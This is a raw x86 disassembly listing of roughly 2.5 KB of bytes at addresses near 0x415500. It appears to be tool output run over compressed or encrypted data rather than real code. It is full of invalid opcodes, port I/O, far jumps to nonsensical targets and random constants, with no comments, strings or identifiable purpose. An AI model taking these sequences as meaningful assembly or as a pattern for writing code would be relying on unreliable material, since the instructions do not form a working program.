  41545d:	repz mov edi,0xadd3e5b0
  415463:	cmp    eax,0xe5679c2a
  415468:	add    BYTE PTR [eax],al
  41546a:	add    BYTE PTR [ecx],al
  41546c:	add    BYTE PTR [eax],al
  41546e:	jge    0x415425
  415470:	fs loopne 0x4154da
  415473:	outs   dx,BYTE PTR ds:[esi]
  415474:	fldenv [ebp-0x4b9231b2]
  41547a:	push   ebp
  41547b:	adc    al,0xb7
  41547d:	mov    ebx,0x583e2e69
  415482:	add    BYTE PTR [edx-0x27aa6b27],bh
  415488:	loop   0x41548a
  41548a:	call   FWORD PTR [edx+0x51]
  41548d:	xor    al,0x2e
  41548f:	and    eax,DWORD PTR [ecx-0x6c4d59cd]
  415495:	add    DWORD PTR [ebx-0x20],ebp
  415498:	iret   
  415499:	cmc    
  41549a:	adc    esi,esi
  41549c:	mov    ebp,0xcc55ae5
  4154a1:	mov    ecx,0xe23228e
  4154a6:	in     eax,0x8d
  4154a8:	add    esi,DWORD PTR [ecx-0x4421596e]
  4154ae:	out    0xf9,al
  4154b0:	neg    BYTE PTR [eax]
  4154b2:	or     ebx,DWORD PTR [ecx+esi*1]
  4154b5:	jl     0x415505
  4154b7:	sub    DWORD PTR [ecx],ecx
  4154b9:	xor    eax,0x9d7291e
  4154be:	mov    bh,BYTE PTR [edi]
  4154c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154c1:	outs   dx,BYTE PTR ds:[esi]
  4154c2:	jp     0x41551f
  4154c4:	pop    ebx
  4154c5:	pushf  
  4154c6:	jg     0x415448
  4154c8:	out    0xa1,al
  4154ca:	call   0xe8b9:0xd78fc3b8
  4154d1:	mov    ecx,0x235eb51
  4154d6:	jg     0x41554f
  4154d8:	jo     0x41548a
  4154da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154db:	fdivr  st,st(7)
  4154dd:	gs dec edi
  4154df:	sub    eax,0xa1c923d6
  4154e4:	ins    BYTE PTR es:[edi],dx
  4154e5:	stos   DWORD PTR es:[edi],eax
  4154e6:	rol    esp,1
  4154e8:	mov    cs,WORD PTR [ebp+0x58d2aafa]
  4154ee:	push   0xffffffe1
  4154f0:	lea    ecx,[eax-0x15]
  4154f3:	dec    esi
  4154f4:	mov    esi,0xfa9ee917
  4154f9:	mov    dl,0xf8
  4154fb:	rcr    BYTE PTR [ebx],cl
  4154fd:	sub    eax,0x86e48721
  415502:	and    eax,0x69da2732
  415507:	mov    bh,0x2
  415509:	ja     0x4154a5
  41550b:	pop    ebx
  41550c:	xor    dl,bh
  41550e:	call   0x95185865
  415513:	inc    ebp
  415514:	and    BYTE PTR [ebx],dl
  415516:	fld    TBYTE PTR [ebp+0x3284eeda]
  41551c:	rcr    DWORD PTR [edi+ecx*8+0x5227baa8],1
  415523:	hlt    
  415524:	mov    eax,0x5265bea7
  415529:	push   ds
  41552a:	jb     0x4154b6
  41552c:	ins    DWORD PTR es:[edi],dx
  41552d:	outs   dx,DWORD PTR ds:[esi]
  41552e:	gs stos DWORD PTR es:[edi],eax
  415530:	push   ss
  415531:	dec    ecx
  415532:	in     al,dx
  415533:	mov    ah,0x44
  415535:	scas   al,BYTE PTR es:[edi]
  415536:	pop    esp
  415537:	jge    0x415598
  415539:	cmp    ebp,esp
  41553b:	js     0x4155b0
  41553d:	repz les eax,FWORD PTR [esi-0x5]
  415541:	dec    esi
  415542:	ja     0x4154d7
  415544:	(bad)  
  415545:	std    
  415546:	sub    ch,al
  415548:	jmp    0x3852d13c
  41554d:	lods   eax,DWORD PTR ds:[esi]
  41554e:	adc    eax,0x2d52d10c
  415553:	arpl   WORD PTR [esi],si
  415555:	cmp    al,0xa0
  415557:	pushf  
  415558:	(bad)  
  41555a:	test   al,0x79
  41555c:	mul    BYTE PTR [ebx-0xc97b8c2]
  415562:	sbb    eax,0x7c415823
  415567:	pop    ecx
  415568:	fucomi st,st(6)
  41556a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41556b:	cdq    
  41556c:	adc    BYTE PTR [edi+0x0],0x0
	...
  4155d3:	add    BYTE PTR [eax],al
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x415634
  4155e3:	aaa    
  4155e4:	or     al,ah
  4155e6:	addr16 out 0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    BYTE PTR [edx],cl
  4155ef:	jae    0x4155de
  4155f1:	lahf   
  4155f2:	adc    al,0x5d
  4155f4:	xor    DWORD PTR [ecx-0x58],edi
  4155f7:	jecxz  0x4155c2
  4155f9:	mov    dl,0x8c
  4155fb:	icebp  
  4155fc:	sub    eax,0xbd8a993e
  415601:	popf   
  415602:	repnz xchg edi,eax
  415604:	dec    edi
  415605:	les    ebp,FWORD PTR [esi+0x5d]
  415608:	push   edi
  415609:	arpl   WORD PTR ds:0x5118410a,di
  41560f:	mov    dl,0xa4
  415611:	mov    ebp,0x369b561f
  415616:	imul   esi,DWORD PTR [edi-0x3abb50f9],0xffffff97
  41561d:	daa    
  41561e:	sub    bh,BYTE PTR [edi]
  415620:	(bad)  
  415621:	xchg   edx,eax
  415622:	pusha  
  415623:	push   esp
  415624:	mov    sp,WORD PTR [ecx+0x70b01ca7]
  41562b:	(bad)  
  41562c:	jl     0x415670
  41562e:	add    ah,BYTE PTR [ebx]
  415630:	add    BYTE PTR [ebx+0xd],ah
  415633:	xor    edi,eax
  415635:	pop    es
  415636:	in     eax,0x3
  415638:	and    BYTE PTR [ebx+edx*1+0x50206414],0x5c
  415640:	sub    DWORD PTR [edi+eiz*1],0xffffffda
  415644:	fnstcw WORD PTR [esi-0x3f3c719f]
  41564a:	repz sub edi,DWORD PTR [edx]
  41564d:	xor    dh,BYTE PTR [ebp+0x20]
  415650:	pop    ds
  415651:	and    BYTE PTR ds:0xb0425ff1,0x68
  415658:	jne    0x4156c9
  41565a:	mov    eax,0x9cb626a8
  41565f:	adc    DWORD PTR [eax+0x3f62358e],esi
  415665:	ficomp WORD PTR [edx-0x4d39b552]
  41566b:	ret    0x7c23
  41566e:	shr    DWORD PTR [ecx-0x173bc2bc],cl
  415674:	sbb    BYTE PTR [ebp+0x69],0xf2
  415678:	mov    edx,0xdf022a70
  41567d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41567f:	out    dx,al
  415680:	je     0x415692
  415682:	jge    0x4156a1
  415684:	leave  
  415685:	sbb    dl,BYTE PTR [edi-0x8]
  415688:	and    eax,0x83b7f56b
  41568d:	enter  0xd560,0x94
  415691:	in     eax,0x74
  415693:	sbb    al,0xe6
  415695:	dec    esi
  415696:	jno    0xb48c3fbc
  41569c:	aam    0x60
  41569e:	or     ch,ah
  4156a0:	shl    ebp,1
  4156a2:	push   es
  4156a3:	mov    ah,0xbf
  4156a5:	retf   
  4156a6:	xor    eax,0x38941160
  4156ab:	sbb    al,0x84
  4156ad:	xchg   ebx,eax
  4156ae:	sbb    cl,BYTE PTR [edx]
  4156b0:	call   0xf60b3857
  4156b5:	int    0x65
  4156b7:	neg    BYTE PTR [edx-0x43b0c6dd]
  4156bd:	adc    BYTE PTR ds:0x48799142,al
  4156c3:	pop    eax
  4156c4:	bound  esp,QWORD PTR [ebp+0x53b7572c]
  4156ca:	data16 lock das 
  4156cd:	push   ds
  4156ce:	jmp    0xef93:0x839b31db
  4156d5:	mov    cl,0x8c
  4156d7:	pop    eax
  4156d8:	mov    ds:0x79623ece,eax
  4156dd:	pop    esp
  4156de:	cmc    
  4156df:	add    esp,eax
  4156e1:	dec    esi
  4156e2:	outs   dx,DWORD PTR ds:[esi]
  4156e3:	stos   BYTE PTR es:[edi],al
  4156e4:	and    BYTE PTR [ebx],bh
  4156e6:	fnstcw WORD PTR [edi]
  4156e8:	ret    0xf3a0
  4156eb:	push   eax
  4156ec:	fucomp st(7)
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x44
  415763:	(bad)  
  415764:	ins    DWORD PTR es:[edi],dx
  415765:	xchg   edx,eax
  415766:	addr16 out 0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    BYTE PTR [ebp-0x45a6ade4],bh
  415773:	or     BYTE PTR [edi],dl
  415775:	and    ebx,DWORD PTR [ecx-0x3]
  415778:	iret   
  415779:	xor    dh,BYTE PTR [edx-0x57]
  41577c:	ins    BYTE PTR es:[edi],dx
  41577d:	mov    eax,DWORD PTR [ecx]
  41577f:	pop    ss
  415780:	and    eax,0x2262510b
  415785:	clc    
  415786:	pop    es
  415787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415788:	hlt    
  415789:	jae    0x41572a
  41578b:	mov    ecx,0x47d77be6
  415790:	test   eax,0xed42ed49
  415795:	add    al,0x16
  415797:	jbe    0x4157ab
  415799:	loop   0x41572a
  41579b:	push   ebx
  41579c:	test   DWORD PTR [edx-0xad603be],edx
  4157a2:	in     eax,dx
  4157a3:	pop    edi
  4157a4:	into   
  4157a5:	repz daa 
  4157a7:	mov    ecx,0xec4aed84
  4157ac:	xor    al,0x37
  4157ae:	not    edx
  4157b0:	cmc    
  4157b1:	dec    edx
  4157b2:	adc    eax,0xb1e64bff
  4157b7:	shr    DWORD PTR [esi-0x47e3cea],1
  4157bd:	fild   QWORD PTR [edx+0x5]
  4157c0:	push   ebp
  4157c1:	retf   
  4157c2:	add    DWORD PTR [esi+edx*1],eax
  4157c5:	jno    0x4157dd
  4157c7:	popf   
  4157c8:	fcomp  st(0)
  4157ca:	dec    edx
  4157cb:	enter  0xfc12,0xa0
  4157cf:	outs   dx,BYTE PTR ds:[esi]
  4157d0:	jmp    0x41580e
  4157d2:	(bad)  
  4157d3:	cld    
  4157d4:	jmp    0x296ca9b6
  4157d9:	push   0xed2d64be
  4157de:	pop    esi
  4157df:	add    BYTE PTR [esi],0x1
  4157e2:	and    bh,bh
  4157e4:	jl     0x41581c
  4157e6:	mov    esp,0x33774311
  4157eb:	ds stos BYTE PTR es:[edi],al
  4157ed:	pop    eax
  4157ee:	aam    0x73
  4157f0:	dec    esi
  4157f1:	cwde   
  4157f2:	and    al,0xc3
  4157f4:	push   esi
  4157f5:	cdq    
  4157f6:	outs   dx,DWORD PTR ds:[esi]
  4157f7:	pop    ebp
  4157f8:	imul   ebx,DWORD PTR [edi],0x7739afc3
  4157fe:	or     edx,ebx
  415800:	ins    DWORD PTR es:[edi],dx
  415801:	and    bl,0x2f
  415804:	fstp   TBYTE PTR [edi]
  415806:	pop    ecx
  415807:	cs fwait
  415809:	shr    DWORD PTR [esi-0x61],cl
  41580c:	dec    ebp
  41580d:	add    al,0x64
  41580f:	shl    DWORD PTR [esi],0x69
  415812:	xor    BYTE PTR [ecx+0x72],dh
  415815:	adc    ah,cl
  415817:	cmc    
  415818:	add    dh,BYTE PTR [ebx+edx*2]
  41581b:	out    dx,al
  41581c:	xor    esi,DWORD PTR [edx]
  41581e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41581f:	add    esp,DWORD PTR [eax]
  415821:	div    BYTE PTR [ebp-0x38]
  415824:	jno    0x4157be
  415826:	out    0x5c,eax
  415828:	ret    0x3ef3
  41582b:	add    al,0xe2
  41582d:	sub    esp,DWORD PTR [ecx-0x7092a7e]
  415833:	repz ja 0x415849
  415836:	leave  
  415837:	or     dh,BYTE PTR [ecx-0x1d]
  41583a:	fs pop edi
  41583c:	mov    ecx,DWORD PTR [ebp+ebx*4-0x55112aa4]
  415843:	outs   dx,BYTE PTR ds:[esi]
  415844:	shl    al,0x34
  415847:	jecxz  0x415861
  415849:	sbb    BYTE PTR [edi+0xc47dc1c],bl
  41584f:	dec    esp
  415850:	add    dl,0x84
  415853:	mov    gs,ebx
  415855:	push   es
  415856:	push   0xd65cdf5c
  41585b:	cdq    
  41585c:	(bad)  
  41585d:	ins    DWORD PTR es:[edi],dx
  41585e:	outs   dx,DWORD PTR ds:[esi]
  41585f:	fstp   TBYTE PTR [eax-0x5146d88d]
  415865:	or     eax,0x27c3d062
  41586a:	pushf  
  41586b:	mov    edi,0xcb33
	...
  4158d4:	add    BYTE PTR [eax],al
  4158d6:	retf   
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	ror    ebp,cl
  4158e3:	icebp  
  4158e4:	push   cs
  4158e5:	jmp    0x100:0xe867
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	jmp    0x4158c3
  4158f0:	cmp    DWORD PTR [ecx-0x28],esi
  4158f3:	ins    DWORD PTR es:[edi],dx
  4158f4:	div    BYTE PTR [ebx]
  4158f6:	mov    ds:0xe454bac7,al
  4158fb:	test   al,0x1a
  4158fd:	mov    ch,0x23
  4158ff:	lods   al,BYTE PTR ds:[esi]
  415900:	dec    edi
  415901:	cs loope 0x415907
  415904:	or     DWORD PTR [ebx+esi*1],esp
  415907:	cmp    al,0x1
  415909:	int3   
  41590a:	sub    eax,0x9297a481
  41590f:	mov    ebp,0x908a3bb0
  415914:	add    BYTE PTR [edi+0x2de3d634],bh
  41591a:	jno    0x415939
  41591c:	lods   eax,DWORD PTR ds:[esi]
  41591d:	mul    BYTE PTR [edx+ecx*4]
  415920:	cmp    DWORD PTR [ebp+0x78],esi
  415923:	mov    DWORD PTR [esi+ecx*2],ebx
  415926:	inc    edi
  415927:	and    ecx,edi
  415929:	cli    
  41592a:	fs repz push esi
  41592d:	mov    DWORD PTR [ebx+0x68],edi
  415930:	xor    BYTE PTR [eax],bl
  415932:	mov    ecx,es
  415934:	loop   0x4158b9
  415936:	fstp   DWORD PTR [edx]
  415938:	mov    al,0x7b
  41593a:	add    al,0x66
  41593c:	jl     0x415969
  41593e:	loope  0x4158cc
  415940:	retf   0xbd31
  415943:	add    edi,DWORD PTR [edi-0xba9d95]
  415949:	(bad)  
  41594a:	push   cs
  41594b:	fwait
  41594c:	pop    es
  41594d:	xchg   ebp,eax
  41594e:	xlat   BYTE PTR ds:[ebx]
  41594f:	iret   
  415950:	cmp    cl,dh
  415952:	mov    bh,0xfe
  415954:	sub    eax,0xd4b368fa
  415959:	scas   al,BYTE PTR es:[edi]
  41595a:	addr16 inc edi
  41595c:	sbb    BYTE PTR [edx+0x3fa7f9ca],0x8
  415963:	ja     0x4159e0
  415965:	fsubr  st,st(5)
  415967:	or     al,dh
  415969:	daa    
  41596a:	xchg   edi,eax
  41596b:	stos   BYTE PTR es:[edi],al
  41596c:	or     eax,0x784cf04b
  415971:	ret    
  415972:	outs   dx,DWORD PTR ds:[esi]
  415973:	jmp    0x41595b
  415975:	mov    ebx,0x445f6293
  41597a:	sar    BYTE PTR [edx],0x12
  41597d:	pusha  
  41597e:	js     0x415925
  415980:	mov    esi,0xc7491d0f
  415985:	dec    esp
  415986:	arpl   WORD PTR [edx-0x2bbffe48],si
  41598c:	fcmove st,st(2)
  41598e:	pop    ecx
  41598f:	push   cs
  415990:	and    al,0x2a
  415992:	test   DWORD PTR [esi+0x4bab0b50],0xb311c84e
  41599c:	fimul  WORD PTR [ebp-0x3c]
  41599f:	dec    ebp
  4159a0:	stos   DWORD PTR es:[edi],eax
  4159a1:	push   edx
  4159a2:	cmp    DWORD PTR [ebx+0x2ae118f2],esp
  4159a8:	or     BYTE PTR [ecx],al
  4159aa:	sbb    al,0x5f
  4159ac:	xor    ch,BYTE PTR [ecx+0x1e38038e]
  4159b2:	or     eax,0x5d20313
  4159b7:	jle    0x415959
  4159b9:	loop   0x4159c2
  4159bb:	mov    BYTE PTR [edx-0x11],dh
  4159be:	mov    ebp,0xba4788b2
  4159c3:	sbb    al,0x3e
  4159c5:	ret    
  4159c6:	out    dx,eax
  4159c7:	jno    0x415a42
  4159c9:	sti    
  4159ca:	jns    0x4159b9
  4159cc:	in     eax,dx
  4159cd:	xor    dh,0x95
  4159d0:	xchg   edx,eax
  4159d1:	xchg   esi,eax
  4159d2:	ja     0x4159d4
  4159d4:	dec    ecx
  4159d5:	push   ebx
  4159d6:	stc    
  4159d7:	or     eax,0xe245adc2
  4159dc:	sbb    al,0x4b
  4159de:	mov    edx,0xc79ebec3
  4159e3:	pusha  
  4159e4:	scas   eax,DWORD PTR es:[edi]
  4159e5:	push   0xffffffd9
  4159e7:	mov    esi,DWORD PTR [ecx]
  4159e9:	gs jmp 0x1050606
	...
  415a53:	add    BYTE PTR [eax],al
  415a55:	add    BYTE PTR [ebp-0x78],al
  415a58:	sub    al,0x77
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	pusha  
  415a63:	mov    bh,BYTE PTR [ecx+0xe967e2]
  415a69:	add    BYTE PTR [eax],al
  415a6b:	add    DWORD PTR [eax],eax
  415a6d:	add    BYTE PTR [ecx+eiz*1-0x134f7d9d],dh
  415a74:	pop    esp
  415a75:	jmp    0x415a98
  415a77:	stos   DWORD PTR es:[edi],eax
  415a78:	push   es
  415a79:	out    dx,al
  415a7a:	shl    BYTE PTR [ebx+0x7f],0x57
  415a7e:	mov    esi,0x4f24e12a
  415a83:	ins    DWORD PTR es:[edi],dx
  415a84:	gs inc eax
  415a86:	pop    ebp
  415a87:	aam    0x9c
  415a89:	push   esp
  415a8a:	outs   dx,DWORD PTR ds:[esi]
  415a8b:	das    
  415a8c:	inc    ebp
  415a8d:	(bad)
  415a90:	jg     0x415aff
  415a92:	mov    al,0x53
  415a94:	xchg   esi,eax
  415a95:	imul   ebp,DWORD PTR ds:0xa65516c5,0xfffffffa
  415a9c:	xlat   BYTE PTR ds:[ebx]
  415a9d:	imul   esi,DWORD PTR [ebp+0x570bedc2],0xffffff96
  415aa4:	inc    eax
  415aa5:	push   bp
  415aa7:	pop    edx
  415aa8:	inc    ebx
  415aa9:	xor    al,0x10
  415aab:	mov    dl,0xf4
  415aad:	lock jle 0x415b19
  415ab0:	sub    edx,esi
  415ab2:	(bad)  
  415ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab4:	mov    bh,BYTE PTR ss:[esi]
  415ab7:	das    
  415ab8:	mov    esp,DWORD PTR [eax+0x48d7061f]
  415abe:	ds xor ax,di
  415ac2:	retf   0xe49
  415ac5:	xchg   edx,eax
  415ac6:	imul   ebx,DWORD PTR [ecx-0x4a],0x74
  415aca:	(bad)  
  415acb:	jnp    0x415b45
  415acd:	mov    dh,0x32
  415acf:	jmp    0x1216:0x88e98882
  415ad6:	scas   al,BYTE PTR es:[edi]
  415ad7:	fst    DWORD PTR [ebp+0x456158a]
  415add:	bound  edi,QWORD PTR ds:0xb8a57ce6
  415ae3:	sbb    bh,BYTE PTR [edx]
  415ae5:	pusha  
  415ae6:	adc    ebp,esp
  415ae8:	imul   ebp,DWORD PTR [esi+ebp*2+0x67ca4103],0x4a
  415af0:	sbb    DWORD PTR [edx+eiz*1-0x69b721a6],esp
  415af7:	setge  BYTE PTR [edx-0x5ee6be48]
  415afe:	dec    eax
  415aff:	aad    0xe5
  415b01:	loopne 0x415af4
  415b03:	fwait
  415b04:	mov    BYTE PTR [esi+0x70],bl
  415b07:	rcr    ebx,1
  415b09:	mov    bl,0x65
  415b0b:	ss pop esp
  415b0d:	test   DWORD PTR [edi+0x59],0x81e8614d
  415b14:	(bad)  
  415b15:	out    0x64,eax
  415b17:	outs   dx,DWORD PTR ds:[esi]
  415b18:	into   
  415b19:	lods   eax,DWORD PTR ds:[esi]
  415b1a:	pop    esp
  415b1b:	jb     0x415b5e
  415b1d:	push   0xf2c0a6f6
  415b22:	shl    DWORD PTR [esi-0x281b0ddd],1
  415b28:	sbb    eax,0xc9528289
  415b2d:	cmc    
  415b2e:	fwait
  415b2f:	cmp    dh,0xdd
  415b32:	cmp    al,0x75
  415b34:	or     dh,BYTE PTR [edx+0x364e6317]
  415b3a:	(bad)  
  415b3c:	cmp    DWORD PTR [ebx+0x25],edi
  415b3f:	and    al,0xc4
  415b41:	stos   DWORD PTR es:[edi],eax
  415b42:	inc    edi
  415b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b44:	ins    DWORD PTR es:[edi],dx
  415b45:	in     al,dx
  415b46:	mov    esi,0xa71b7c1a
  415b4b:	int3   
  415b4c:	dec    eax
  415b4d:	fcomp  DWORD PTR [edi+eiz*8-0x5b]
  415b51:	js     0x415bb0
  415b53:	enter  0xbb56,0xad
  415b57:	in     eax,0x51
  415b59:	or     DWORD PTR [edx+0x468645b5],edi
  415b5f:	gs jne 0x415ba3
  415b62:	rol    BYTE PTR [eax],0x9
  415b65:	inc    ecx
  415b66:	pop    ebp
  415b67:	js     0x415bd9
  415b69:	xor    al,0x38
  415b6b:	cwde   
  415b6c:	jmp    0x415bd0
	...
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdivr  QWORD PTR [ecx-0x1f]
  415be4:	sbb    ah,BYTE PTR [edi+eiz*2+0xea]
  415beb:	add    DWORD PTR [eax],eax
  415bed:	add    dl,dl
  415bef:	iret   
  415bf0:	iret   
  415bf1:	imul   ebx,DWORD PTR [ecx-0x45],0xcaf7b15e
  415bf8:	aam    0x29
  415bfa:	inc    esi
  415bfb:	sti    
  415bfc:	jl     0x415bdc
  415bfe:	outs   dx,DWORD PTR ds:[esi]
  415bff:	pop    esi
  415c00:	xchg   ebx,eax
  415c01:	adc    DWORD PTR [esi+0x54d7b575],0x59
  415c08:	xchg   bh,al
  415c0a:	in     eax,dx
  415c0b:	jne    0x415c39
  415c0d:	test   DWORD PTR [eax],esi
  415c0f:	adc    edx,DWORD PTR [edi+0x61]
  415c12:	push   esp
  415c13:	sbb    BYTE PTR [esp+eax*8+0x34e1b260],dh
  415c1a:	jnp    0x415c32
  415c1c:	loopne 0x415c82
  415c1e:	imul   esi,esp,0xbc4c19c5
  415c24:	cmp    al,0xca
  415c26:	adc    al,0x2e
  415c28:	in     eax,0xb5
  415c2a:	push   es
  415c2b:	jmp    0x415c5d
  415c2d:	outs   dx,DWORD PTR ds:[esi]
  415c2e:	shl    BYTE PTR [ebp-0x57],0x16
  415c32:	out    dx,eax
  415c33:	sahf   
  415c34:	xchg   esp,eax
  415c35:	sbb    DWORD PTR [edi],0xffffffd3
  415c38:	rcr    bl,0xc
  415c3b:	jae    0x415c39
  415c3d:	mov    ss,WORD PTR [edx+0x21]
  415c40:	into   
  415c41:	into   
  415c42:	fbld   TBYTE PTR [esi]
  415c44:	ins    BYTE PTR es:[edi],dx
  415c45:	inc    ecx
  415c46:	jmp    0x49bf:0x91ea8f64
  415c4d:	out    dx,eax
  415c4e:	mov    ah,BYTE PTR [edx+ecx*2]
  415c51:	xchg   ebp,eax
  415c52:	lods   eax,DWORD PTR ds:[esi]
  415c53:	pusha  
  415c54:	sub    eax,DWORD PTR [edi]
  415c56:	pop    esp
  415c57:	mov    BYTE PTR [ebx-0x38b9549d],al
  415c5d:	mov    ds:0xa5aae24b,al
  415c62:	sbb    eax,0x6ce3b5ce
  415c67:	or     bl,BYTE PTR [ebx]
  415c69:	cmp    al,0x67
  415c6b:	scas   eax,DWORD PTR es:[edi]
  415c6c:	mov    cl,0x85
  415c6e:	mov    esp,0x5a3f6a0c
  415c73:	scas   eax,DWORD PTR es:[edi]
  415c74:	add    eax,0xdaf2eec8
  415c79:	sub    eax,0x2be77713
  415c7e:	gs inc edx
  415c80:	jne    0x415c3b
  415c82:	jo     0x415d01
  415c84:	add    al,0xcb
  415c86:	pop    esp
  415c87:	pop    eax
  415c88:	mov    DWORD PTR [edx],ecx
  415c8a:	dec    ecx
  415c8b:	push   cs
  415c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c8d:	add    bh,BYTE PTR [ebp+0x2e9de7db]
  415c93:	add    DWORD PTR cs:[edx+0x75222df7],0x5e
  415c9b:	push   esp
  415c9c:	shl    dl,0x37
  415c9f:	adc    ecx,DWORD PTR [ebx]
  415ca1:	popf   
  415ca2:	add    edx,DWORD PTR [ebp+eax*2-0x26]
  415ca6:	push   0xe
  415ca8:	test   eax,0xc9c0c8be
  415cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cae:	cmp    DWORD PTR ds:0xfce74e02,edx
  415cb4:	fstp   TBYTE PTR [edx]
  415cb6:	adc    cl,BYTE PTR [eax+0x109d6e01]
  415cbc:	je     0x415c73
  415cbe:	adc    al,0xda
  415cc0:	loop   0x415c88
  415cc2:	out    dx,al
  415cc3:	push   ss
  415cc4:	add    al,BYTE PTR [ecx-0x67b29b19]
  415cca:	mov    dl,0x6
  415ccc:	std    
  415ccd:	jecxz  0x415cd8
  415ccf:	ror    DWORD PTR [edx+0x6240390],0x82
  415cd6:	in     al,dx
  415cd7:	sub    DWORD PTR [eax+0x58],edi
  415cda:	dec    ebx
  415cdb:	xor    DWORD PTR [eax-0x3f2b319a],0xa34813e2
  415ce5:	mov    al,ds:0xaec695f9
  415cea:	scas   eax,DWORD PTR es:[edi]
  415ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cec:	adc    bl,BYTE PTR [ebx+0x0]
	...
  415d53:	add    BYTE PTR [eax],al
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x1ec9511f
  415d65:	test   eax,0xeb67
  415d6a:	add    BYTE PTR [ecx],al
  415d6c:	add    BYTE PTR [eax],al
  415d6e:	jle    0x415d04
  415d70:	sub    al,0x92
  415d72:	jle    0x415d24
  415d74:	push   ebx
  415d75:	cmp    eax,0x98d0d76b
  415d7a:	xchg   ebx,eax
  415d7b:	pusha  
  415d7c:	cdq    
  415d7d:	cmp    BYTE PTR [edx-0x7a],0x13
  415d81:	test   DWORD PTR [eax-0x225e201b],esp
  415d87:	shr    DWORD PTR [ebp+0x74],cl
  415d8a:	push   esp
  415d8b:	popf   
  415d8c:	mov    ds:0x8c65a23e,al
  415d91:	fld    TBYTE PTR [edx+0x4eb5cef]
  415d97:	or     BYTE PTR [edi+0x7c],cl
  415d9a:	jmp    FWORD PTR ds:0xe5572d8e
  415da0:	lods   eax,DWORD PTR ds:[esi]
  415da1:	outs   dx,DWORD PTR ds:[esi]
  415da2:	pop    ss
  415da3:	jmp    0x415d29
  415da5:	xchg   esi,eax
  415da6:	popf   
  415da7:	neg    dh
  415da9:	lea    eax,ss:[edi+0x25273c92]
  415db0:	in     eax,0x9e
  415db2:	sbb    BYTE PTR [eax-0x23b4b8d9],bh
  415db8:	sbb    ecx,esp
  415dba:	leave  
  415dbb:	popf   
  415dbc:	pop    ss
  415dbd:	jo     0x415e08
  415dbf:	idiv   DWORD PTR ds:0xe045
  415dc4:	out    0xc1,al
  415dc6:	(bad)  
  415dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dc8:	outs   dx,DWORD PTR ds:[esi]
  415dc9:	dec    edx
  415dca:	out    0xa8,al
  415dcc:	ins    BYTE PTR es:[edi],dx
  415dcd:	jno    0x415d57
  415dcf:	jp     0x415d5a
  415dd1:	mov    esi,0x48d0f72c
  415dd6:	cdq    
  415dd7:	sbb    ecx,DWORD PTR [ebx-0x4308cf]
  415ddd:	js     0x415e1e
  415ddf:	push   eax
  415de0:	inc    edx
  415de1:	sub    eax,0x4c375f87
  415de6:	xchg   edx,eax
  415de7:	add    edx,DWORD PTR [esi]
  415de9:	sbb    BYTE PTR [edx-0x1f],dl
  415dec:	fsubr  st,st(6)
  415dee:	fwait
  415def:	xchg   ecx,eax
  415df0:	inc    eax
  415df1:	nop
  415df2:	add    DWORD PTR [ebx],ebx
  415df4:	and    ah,BYTE PTR cs:[esp+esi*1-0x746fbc4a]
  415dfc:	dec    ebx
  415dfd:	test   eax,0xb3eefd0f
  415e02:	int    0xa9
  415e04:	(bad)  
  415e06:	or     ebx,DWORD PTR [ebx+0x7a]
  415e09:	into   
  415e0a:	mov    ch,al
  415e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e0d:	ja     0x415db3
  415e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e10:	adc    BYTE PTR [ebp-0x455e0d2c],ch
  415e16:	or     al,BYTE PTR [esi-0x65fec312]
  415e1c:	aad    0x8
  415e1e:	cli    
  415e1f:	ret    0x5292
  415e22:	dec    edi
  415e23:	jp     0x415e46
  415e25:	sub    DWORD PTR [esi-0x5a],ebx
  415e28:	pop    ds
  415e29:	add    BYTE PTR [eax-0x59],0x3f
  415e2d:	cmp    edi,DWORD PTR [ecx+ecx*2+0x18]
  415e31:	jmp    0xaadb:0x2e16e797
  415e38:	pushf  
  415e39:	(bad)  
  415e3a:	adc    dh,BYTE PTR [ebp+0x4a]
  415e3d:	js     0x415de0
  415e3f:	fist   WORD PTR [edx+0x5ca11cec]
  415e45:	enter  0x1aa7,0xc3
  415e49:	or     edx,edi
  415e4b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e4d:	lahf   
  415e4e:	mov    eax,ds:0xe2c6b19f
  415e53:	rcr    esp,cl
  415e55:	jmp    0xb0c3f9a1
